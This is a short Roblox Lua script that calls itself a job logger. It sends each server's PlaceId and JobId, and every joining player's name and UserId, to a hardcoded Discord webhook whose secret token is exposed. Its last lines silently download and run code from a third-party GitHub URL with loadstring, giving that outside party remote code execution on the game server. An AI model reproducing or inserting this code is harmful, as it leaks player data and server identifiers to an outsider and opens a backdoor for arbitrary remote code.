local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1406162216247623792/DdZdihmGWBrJQxh5l97gKP3p_21wCtHL5kDfwPoKPs7qt5Kss3uJByOtQdmsd_GPRROH"

local function sendJobLog()
    local payload = {
        username = "Roblox Job Logger",
        embeds = {{
            title = "Server Started",
            color = 65280,
            fields = {
                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
                { name = "JobId", value = tostring(game.JobId), inline = true },
                { name = "Players", value = tostring(#game.Players:GetPlayers()), inline = true },
                { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false }
            }
        }}
    }
    local json = HttpService:JSONEncode(payload)
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
    end)
end

sendJobLog()

game.Players.PlayerAdded:Connect(function(player)
    local payload = {
        username = "Roblox Job Logger",
        embeds = {{
            title = "Player Joined",
            color = 3447003,
            fields = {
                { name = "Player", value = player.Name .. " (" .. player.UserId .. ")", inline = false },
                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
                { name = "JobId", value = tostring(game.JobId), inline = true },
                { name = "Current Players", value = tostring(#game.Players:GetPlayers()), inline = false }
            }
        }}
    }
    local json = HttpService:JSONEncode(payload)
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
    end)
end)

-- Run external script
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/growagarden/refs/heads/main/script.lua"))()
end)
